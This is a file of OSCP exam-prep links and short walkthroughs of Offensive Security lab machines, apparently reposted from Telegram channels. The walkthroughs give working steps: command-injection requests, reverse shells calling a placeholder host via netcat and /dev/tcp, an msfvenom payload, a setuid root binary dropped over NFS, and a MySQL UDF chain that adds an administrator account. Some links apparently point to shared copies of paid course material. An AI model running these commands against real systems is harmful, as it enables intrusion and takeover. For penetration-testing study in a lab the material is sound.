@@ -1,0 +1,381 @@
+-------------------------
+join us
+dl.linuxia.ir
+t.me/SansPentest
+t.me/RedBlueTM
+t.me/Hide01
+-------------------------
+
+OSCP Course Review
+Offensive Security’s PWB and OSCP — My Experience
+http://www.securitysift.com/offsec-pwb-oscp/
+
+OSCP Journey
+https://scriptkidd1e.wordpress.com/oscp-journey/
+
+Down with OSCP
+http://ch3rn0byl.com/down-with-oscp-yea-you-know-me/
+
+Jolly Frogs - Tech Exams (Very thorough)
+
+http://www.techexams.net/forums/security-certifications/110760-oscp-jollyfrogs-tale.html
+
+OSCP Inspired VMs and Walkthroughs
+https://www.hackthebox.eu/
+
+https://www.root-me.org/
+
+https://www.vulnhub.com/
+
+https://epi052.gitlab.io/notes-to-self/blog/2020-05-13-osce-exam-practice-part-one/
+
+https://epi052.gitlab.io/notes-to-self/blog/2020-05-14-osce-exam-practice-part-two/
+
+https://epi052.gitlab.io/notes-to-self/blog/2020-05-18-osce-exam-practice-part-three/
+
+https://epi052.gitlab.io/notes-to-self/blog/2020-05-19-osce-exam-practice-part-five/
+
+M0nkeyShell:
+How to prepare for OSCP complete guide
+
+Below are the free reference before registration of OSCP 
+    https://www.cybrary.it/course/ethical-hacking/
+    https://www.cybrary.it/course/web-application-pen-testing/
+    https://www.cybrary.it/course/advanced-penetration-testing/
+    https://www.offensive-security.com/metasploit-unleashed/
+    https://www.cybrary.it/course/python/
+
+
+Below are the reference for Buffer overflow and exploit developmet for OSCP
+    http://www.fuzzysecurity.com/tutorials/expDev/1.html
+    https://www.corelan.be/index.php/2009/07/19/exploit-writing-tutorial-part-1-stack-based-overflows/
+
+OSCP Exam & write-ups.
+https://t.co/pKCy6SU8ys
+https://t.co/gwAX04sSxM
+https://t.co/XumJiFifKg
+https://t.co/eXqlYKIfSJ
+https://t.co/mDwT9xOUXQ
+https://t.co/IdgqQDQ9Co
+https://t.co/wB03wJ4GOX
+https://t.co/d5l1TxnbEv
+https://t.co/yTxw2CzPC6
+https://t.co/tVFntLeyid
+
+OSCP Ressources
+OSCP Survival Guide : https://github.com/Sturmrufer/OSCP-Survival-Guide_
+Pentest Compilation :https://github.com/adon90/pentest_compilation
+OSCP Cheat Sheet : https://github.com/mikaelkall/OSCP-cheat-sheet
+OSCP Tools : https://github.com/cokebottle/oscp-tools
+OSCP Notes : https://github.com/kyawthiha7/oscp_notes
+OSCP5 : https://github.com/sojamo/oscp5
+OSCP Prep : https://github.com/burntmybagel/OSCP-Prep
+Cheatsheets : ttps://github.com/slyth11907/Cheatsheets
+Cheatsheet-God : https://github.com/OlivierLaflamme/Cheatsheet-God
+OSCP Exam Report Template : https://github.com/noraj/OSCP-Exam-Report-Template-Markdown
+http://buffered.io/posts/osce-and-me/
+https://github.com/xxooxxooxx/xxooxxooxx.github.io/wiki/OSCP-Survival-Guide
+https://hackingandsecurity.blogspot.com/2017/09/oscp-windows-priviledge-escalation.html
+https://www.puckiestyle.nl/oscp-notes/
+http://futureoscp.blogspot.com/2017/10/usefull-oscp-material.html
+https://sushant747.gitbooks.io/total-oscp-guide/webshell.html
+http://www.securitysift.com/offsec-pwb-oscp/
+https://sushant747.gitbooks.io/total-oscp-guide/webshell.html
+http://www.securitysift.com/offsec-pwb-oscp/
+https://redteams.fr/mindmap/view.html?url=%2Fmindmap%2Fmaps%2Foscp.mymind
+
+OSCP Reviews:
+https://localhost.exposed/path-to-oscp/
+http://www.en-lightn.com/?p=941
+http://www.securitysift.com/offsec-pwb-oscp/
+https://blog.g0tmi1k.com/2011/07/pentesting-with-backtrack-pwb/
+http://www.jasonbernier.com/oscp-review/
+https://n3ko1.github.io/certification/2015/05/27/oscp---offensive-security-certified-professional/
+https://mega.nz/folder/C55QjSxa#FmmJ_YK6XtvRargobLZhdw/folder/69RGmK4S
+
+Precompiled Exploits:
+https://github.com/offensive-security/exploit-database-bin-sploits
+https://www.kernel-exploits.com/
+
+MSFVenom:
+http://netsec.ws/?p=331
+http://www.securityunlocked.com/2016/01/02/network-security-pentesting/most-useful-msfvenom-payloads/
+Devil Dawg, [10.12.20 03:53]
+Shellcode:
+http://www.primalsecurity.net/0x0-shellcoding-tutorial-introduction-to-asm/
+https://paraschetal.in/writing-your-own-shellcode
+http://althing.cs.dartmouth.edu/local/shellcode.html
+https://www.exploit-db.com/docs/17065.pdf
+
+[Forwarded from Devil Dawg]
+Rev/Web Shells:
+http://tools.kali.org/maintaining-access/webshells
+http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet
+https://github.com/stasinopoulos/commix/wiki/Upload-shells
+https://drive.google.com/drive/folders/1DVVppDVzGQxDJCKJDtxYoDLCLS1SR8So
+https://drive.google.com/drive/folders/1q2sOBNU4lPBkwtF1Msl6uCACBV5TUGWD
+https://mega.nz/folder/C55QjSxa#FmmJ_YK6XtvRargobLZhdw/folder/69RGmK4S
+http://netsec.ws/?p=278
+https://www.matteomalvica.com/minutes/pentesting/
+https://toshellandback.com/2015/11/24/ms-priv-esc/
+https://oscp.brutef0rce.com/
+
+https://www.andreafortuna.org/2017/12/11/metasploit-console-my-own-cheatsheet/
+https://www.pdq.com/blog/modifying-the-registry-of-another-user/
+
+https://root4loot.com/pentools/
+https://support.offensive-security.com/pwk-connectivity-guide/
+https://unix.stackexchange.com/questions/83319/where-are-the-current-kernel-build-options-stored
+https://www.exploit-db.com/papers/12975
+https://recipeforroot.com/
+http://pentestmonkey.net/cheat-sheet/john-the-ripper-hash-formats
+
+https://www.anarchy-farm.com/windows-privilege-escalation-by-hand/
+
+Rev/Web Shells:
+http://tools.kali.org/maintaining-access/webshells
+http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet
+
+https://highon.coffee/blog/reverse-shell-cheat-sheet/
+https://github.com/JohnTroony/php-webshells
+
+Spawn TTY Shell:
+http://netsec.ws/?p=337
+
+Tools
+http://tools.kali.org/tools-listing
+http://tools.kali.org/password-attacks/patator
+http://tools.kali.org/web-applications/dirb
+http://tools.kali.org/web-applications/dirbuster
+http://tools.kali.org/web-applications/gobuster
+http://tools.kali.org/web-applications/wpscan
+http://tools.kali.org/web-applications/joomscan
+http://tools.kali.org/vulnerability-analysis/sqlmap
+http://tools.kali.org/exploitation-tools/commix
+http://tools.kali.org/maintaining-access/weevely
+http://tools.kali.org/password-attacks/ncrack
+http://tools.kali.org/password-attacks/cewl
+http://tools.kali.org/information-gathering/dotdotpwn
+http://tools.kali.org/exploitation-tools/shellnoob
+http://tools.kali.org/exploitation-tools/shellnoob
+
+Wordlists
+http://tools.kali.org/password-attacks/wordlists
+https://github.com/danielmiessler/SecLists
+https://github.com/govolution/betterdefaultpasslist
+
+Pen Test Cheat Sheets:
+https://github.com/Hack-with-Github/Awesome-Hacking
+https://jivoi.github.io/2015/07/01/pentest-tips-and-tricks/
+http://pwnwiki.io/
+https://github.com/enaqx/awesome-pentest
+
+Cheat Sheets
+Penetration Tools Cheat Sheet
+https://highon.coffee/blog/penetration-testing-tools-cheat-sheet/
+
+Pen Testing Bookmarks
+https://github.com/kurobeats/pentest-bookmarks/blob/master/BookmarksList.md
+
+OSCP Cheatsheets
+https://github.com/slyth11907/Cheatsheets
+
+
+OSCP + PWK 2020
+https://drive.google.com/drive/folders/1tvRNs5Wb0GAjzHWZ3oY3XOsgb4AjZTt_
+https://mega.nz/folder/zkAByYib#DGpYHcp8oUrf0g5eiww4Jg
+
+
+
+
+UCAL WRITEUP
+
+Run nikto against the host
+nikto -host 192.168.x.55
+
+You will find
+
++ OSVDB-3093: /webcalendar/login.php: This might be interesting... has been seen in web logs from an unknown scanner.
+use the following exploit to gain a reverse shell https://www.exploit-db.com/raw/18775/
+then use Mempodipper to escalate your privs,https://www.exploit-db.com/raw/35161/
+And you\'re done'
+
+
+
+
+UNREAL TOURNAMENT WRITEUP
+
+Scan ports using nmap: nmap 192.168.x.53 -Pn 
+You will find IRC port accessible, connect to it using IRC client you will find message stating that there is unreal tournament service running at port 7778 UDP.
+Use this exploit https://www.exploit-db.com/exploits/16145/ and replace the shell code with the output of
+msfvenom  -p windows/shell_reverse_tcp LHOST=192.168.x.x36.31 LPORT=1111  EXITFUNC=thread -f perl -e x86/alpha_mixed
+Start Metasploit listener and launch the exploit and you're done.
+
+
+
+
+Ph33r WRITEUP
+
+[Forwarded from Devil Dawg]
+ADMIN-PC WRITEUP
+
+Exploitation
+Scan the machine using
+nmap 192.168.x.55 -A
+
+One interesting part is the ftp service output
+
+21/tcp    open  ftp     syn-ack ttl 128| fingerprint-strings: |   GenericLines: |     220-Wellcome to Home Ftp Server!|     Server ready.|     command not understood.|     command not understood.|   Help: |     220-Wellcome to Home Ftp Server!|     Server ready.|     \HELP\: command not understood.|   NULL, SMBProgNeg: |     220-Wellcome to Home Ftp Server!|_    Server ready.| ftp-anon: Anonymous FTP login allowed (FTP code 230)| drw-rw-rw-   1 ftp      ftp            0 Dec 28  2015 . [NSE: writeable]|_drw-rw-rw-   1 ftp      ftp            0 Dec 28  2015 .. [NSE: writeable]
+
+Connect to the server and get the xampp config fileUse user anonymous with any password
+
+[root:~/Desktop]# ftpftp> o(to) 192.168.x.55
+Connected to 192.168.x.55.220-
+Wellcome to Home Ftp Server!
+220 Server ready.Name (192.168.x.55:root): anonymous331 Password required for anonymous.Password:230 User Anonymous logged in.Remote system type is UNIX.Using binary mode to transfer files.
+ftp> get ../xampp/security/webdav.htpasswdlocal: ../xampp/security/webdav.htpasswd remote: ../xampp/security/webdav.htpasswd200 Port command successful.150 Opening data connection for ../xampp/security/webdav.htpasswd.226 File sent ok
+
+the file contain the credentialsfm:$apr1$yT3K79by$RbmkKdKGdaXs80zPCIZnR1Crack the password, you will get the plaintextfm:x-filesNow connect to192.168.x.55:10433/adminwhich is file manager allowing executable filesupload netcat.exe and then upload php file including system(\nc –vv YOUR_HOST 443 –e cmd.exe\); to gain shell access
+
+Escalation
+Upload jsp shell file to c:/xampp/tomcat/webapps/examplesthen browse it using 192.168.x.55:10433/examples/cmd.jsp?cmd=whoami
+And you're an admin, 192.168.x.55 -
+
+[Forwarded from Devil Dawg]
+This is an easy machine, click to pwn one
+nmap -A 192.168.x.161
+80/tcp  open  http       syn-ack ttl 64 Apache httpd 1.3.33 ((Debian GNU/Linux))
+| http-methods: 
+|_  Potentially risky methods: TRACE
+|_http-server-header: Apache/1.3.33 (Debian GNU/Linux)
+|_http-title: Ph33r
+139/tcp open  tcpwrapped syn-ack ttl 64
+use onesixtyone against it, You will find clam av is up and running
+Use black-hole exploit against the machine
+https://www.exploit-db.com/exploits/9913/
+after executing it port 31337 will be opened at the machine, you can connect to it using
+nc -vv 192.168.x.161 31337
+and you’re root
+
+
+
+
+OUTOFBOX WRITEUP
+
+Information gathering
+Scan the host using
+1. nmap 192.168.x.53 -A
+You will get port 80 accessible
+open 192.168.x.53/robots.txt
+You will get 2 md5 values which represent a directories
+example : xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx 
+
+Exploitation
+You will find an LFI vuln at
+GET /xxxxxxxxxxxxxxxxxxxxxxxx/inc2.html?passwd 
+There is a user called OutOfBox will appear in the response
+You can use it to connect to ssh using
+username : OutOfBox
+password : OutOfBox
+ssh OutOfBox@192.168.xx.53
+OutOfBox@offsecsmtp:~$ id
+uid=1001(OutOfBox) gid=1001(OutOfBox) groups=1001(OutOfBox)
+
+Escalation
+NFS share is writable, you can create an executable which is running using setuid(0) suitable suid bit, upload it to the shared folder and execute it, You will get root access
+[root:~/Desktop]# showmount -e 192.168.xx.53
+Export list for 192.168.xx.53:
+/shared 192.168.xx.0/255.255.255.0
+[root:~/Desktop]# mkdir /tmp/mymount
+/bin/mkdir: created directory '/tmp/mymount'
+[root:~/Desktop]# mount -t nfs 192.168.xx.53:/shared /tmp/mymount -o nolock
+[root:~/Desktop]# cat /root/Desktop/exploit.c
+#include <stdio.h>
+#include <unistd.h>
+int main(void)
+{
+setuid(0);
+setgid(0);
+system("/bin/bash");
+}
+gcc exploit.c -m32 -o exploit
+[root:/tmp/mymount]# cp /root/Desktop/x /tmp/mymount/
+[root:/tmp/mymount]# chmod u+s exploit
+Now go to /shared folder on offsec machine, execute ./exploit and you’re root
+
+ 
+
+ 
+ 
+ADAM WRITEUP
+
+Scan the host
+You'll find the port 80 open.
+Send the following request to get an RCE
+
+Create an index.php file on your host and add this content to it
+bash -i >& /dev/tcp/YOUR_HOST/443 0>&1
+Send the following request using burp to the host
+
+POST /index.php?page=ping.php 
+HTTP/1.1
+Host: 192.168.x.67
+User-Agent: xxxxxxxxxxxxxxxxxxxxxxx
+Accept: text/html,application/xhtml+xml,application/xml; q=0.9,*/*; q=0.8
+Accept-Language: en-US,en; q=0.5
+DNT: 1
+Referer: https:/192.168.x.67/index.php?page=ping.php
+Connection: close
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 55
+
+ip=127.0.0.1 wget YOUR_HOST -O shell&send=Ping+It!
+
+This will download the index file of yourhost as "shell"
+Re run the job using
+GET /index.php?page=job.php&job=JOB_ID 
+HTTP/1.1
+Host: 192.168.x.67
+Accept: text/html,application/xhtml+xml,application/xml; q=0.9,*/*; q=0.8
+Accept-Language: en-US,en; q=0.5
+DNT: 1
+
+Now to execute the reverse shell set the ip parameter to 127.0.0.1
+bash shell
+And again find the job it and run it
+And you're done
+
+
+
+
+
+OFFENSIV-W2K3 WRITEUP
+
+Open http:/192.168.x.67:8080/mail/checkspool.php
+the file is vulnerable to rce, use
+it to gain a reverse shell
+
+Escalation
+
+read C:\Program Files\hMailServer\Bin\hMailServer.INI
+which contain encrypted root password
+decrypt it using C:\Program Files\hMailServer\Addons\Utilities\DecryptBlowfish.vbs
+Edit it and add your password just like
+https:/www.hmailserver.com/forum/viewtopic.php?t=31096
+Upload lib_mysqludf_sys.dll to C:\xampplite\htdocs
+then upload adminer.php
+connect to it and then execute following queries to call the lib
+
+USE mysql; CREATE TABLE mytbl(line blob); INSERT INTO mytbl values(load_file('C:/xampplite/htdocs /lib_mysqludf_sys.dll')); SELECT * FROM mysql.mytbl INTO DUMPFILE 'c:/windows/system32/lib_mysqludf_sys_32.dll'; CREATE FUNCTION sys_exec RETURNS integer SONAME 'lib_mysqludf_sys_32.dll'; SELECT sys_exec("net user testu P@ssw0rd /add"); SELECT sys_exec("net localgroup Administrators testu /add"); 
+
+this will add user to the administrator group
+use it, and you're admin
+
+
+-------------------------
+join us
+dl.linuxia.ir
+t.me/SansPentest
+t.me/RedBlueTM
+t.me/Hide01
+-------------------------
